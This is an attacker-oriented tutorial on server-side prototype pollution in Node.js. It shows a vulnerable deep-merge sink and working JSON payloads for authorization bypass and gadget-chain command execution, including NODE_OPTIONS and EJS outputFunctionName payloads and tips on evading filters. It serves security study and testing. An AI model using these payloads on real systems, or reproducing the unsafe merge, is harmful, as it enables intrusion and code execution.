---
title: "Server-side prototype pollution in Node.js to auth bypass and RCE"
description: "Untrusted JSON deep-merged or recursively assigned lets __proto__ and constructor.prototype keys poison Object.prototype, changing shared defaults that drive logic bypass and gadget-chain command execution."
keywords:
  - prototype pollution
  - server-side Node.js
  - __proto__ payload
  - constructor prototype
  - deep merge sink
  - gadget chain RCE
---

# Prototype pollution

Prototype pollution abuses the fact that in JavaScript every plain object shares a single prototype, `Object.prototype`. When an application copies untrusted keys into an object with a recursive merge or assignment, a key named `__proto__` or `constructor.prototype` does not create an ordinary property, it walks up to the shared prototype and writes there. Every object in the process that does not define that property itself now inherits the attacker's value. Nothing attacker-authored is evaluated; the attack changes the defaults the application reads from, and the impact depends on where those defaults are later consumed.

## The sink

The vulnerable pattern is any recursive copy of attacker-controlled data into an object, where the key path is taken from the input rather than from a fixed allowlist. Hand-rolled deep merges, older `lodash` merge/set helpers, query-string parsers that build nested objects, and recursive `Object.assign` wrappers are the usual sources.

```javascript
// recursive merge that honors attacker-chosen keys
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);   // recurses into __proto__
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

app.post('/profile', (req, res) => {
  const user = {};
  merge(user, req.body);                 // req.body is untrusted JSON
});
```

When the recursion descends into a key named `__proto__`, `target[key]` resolves to `Object.prototype`, and the inner assignment writes onto the shared prototype instead of onto `user`.

## The polluting payload

The request body carries a `__proto__` key whose nested properties become global defaults:

```json
{"__proto__": {"polluted": "yes"}}
```

After this request, any later `({}).polluted` in the process returns `"yes"`. The `constructor.prototype` path reaches the same prototype and is the variant to reach for when `__proto__` is filtered, because many filters block the literal string `__proto__` only:

```json
{"constructor": {"prototype": {"polluted": "yes"}}}
```

Both land on `Object.prototype`. A quick confirmation that pollution took hold, independent of any application behavior, is to set a property that no object defines and read it back from a fresh object elsewhere in the flow.

```json
{"__proto__": {"isAdmin": true}}
```

## Escalation: logic and authorization bypass

Pollution alone is not the payoff; it changes shared defaults, and the exploit is choosing a property the application reads without setting. Code that checks an optional flag with a truthiness test and never assigns a default is the classic target:

```javascript
// elsewhere in the app, long after the merge
if (user.isAdmin) grantAdmin();          // user never set isAdmin
```

Because `user` does not define `isAdmin`, the lookup falls through to the polluted prototype and returns `true`. The same mechanism defeats checks that read configuration flags, feature gates, or access-control attributes from objects that were built from partial input. Properties that gate security decisions (`isAdmin`, `role`, `authenticated`, `canEdit`), properties that control parsing or limits, and properties consumed by downstream libraries are all candidates. The polluted value is shared process-wide, so it also affects other users' requests until the process restarts, which widens a single poisoning request into a global state change.

## Escalation: gadget chains to command execution

Command execution requires a reachable gadget: a place where the application or a dependency reads a polluted property and passes it into a dangerous sink. Pollution supplies the value; the gadget supplies the path to execution. The most-cited server-side gadget is `child_process` option handling, where a polluted option controls how a command is spawned.

`child_process.spawn`, `exec`, and `execSync` consult an options object for `shell`, `env`, and related settings. Whether a polluted prototype reaches them is version-dependent: current Node releases normalize the options into a null-prototype object by copying own properties before reading `shell`/`env`, so inherited values from `Object.prototype` no longer flow in. On older Node versions (and in libraries that spawn with their own option handling that reads inherited properties), the polluted defaults are picked up when the caller did not set them:

```json
{"__proto__": {"shell": "/proc/self/exe", "argv0": "node", "NODE_OPTIONS": "--require /proc/self/environ"}}
```

```json
{"__proto__": {"env": {"NODE_OPTIONS": "--require=/tmp/evil.js"}}}
```

Where the gadget applies, a spawn helper called without an explicit `env` or `shell` picks up the polluted defaults, and `NODE_OPTIONS=--require` forces Node to load an attacker-chosen module, which executes its top-level code. Confirm the target's Node version and the specific spawn path rather than assuming the gadget fires everywhere. Template engines are the other classic gadget family: several (for example older EJS and Pug/Jade configurations) read compilation options such as `outputFunctionName`, `escapeFunction`, or a client/compileDebug flag from the options object, and a polluted option is concatenated into the generated function source, turning render into code execution.

```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"}}
```

The chain is always two parts: a pollution sink that writes the prototype, and a separate gadget that reads an unset property into a sink. Confirm the pollution first with a harmless marker property, then enumerate which libraries in the target read option objects without defaulting their fields, and match the payload to one of those gadgets. Where no gadget is reachable, the realistic ceiling is logic and authorization bypass and denial of service (for example polluting a property that later throws or forces an unexpected branch across every request).

## Tools

- **Burp Suite**: Repeater to send __proto__/constructor payloads and confirm polluted defaults.
- **Server-Side Prototype Pollution Scanner**: PortSwigger Burp extension detecting server-side pollution sinks.
- Manual gadget hunting for unset option properties read by libraries.

## References

- [OWASP: Prototype Pollution](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [PortSwigger: Server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side)
- [PayloadsAllTheThings: Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution)
- [Node.js: child_process](https://nodejs.org/api/child_process.html)
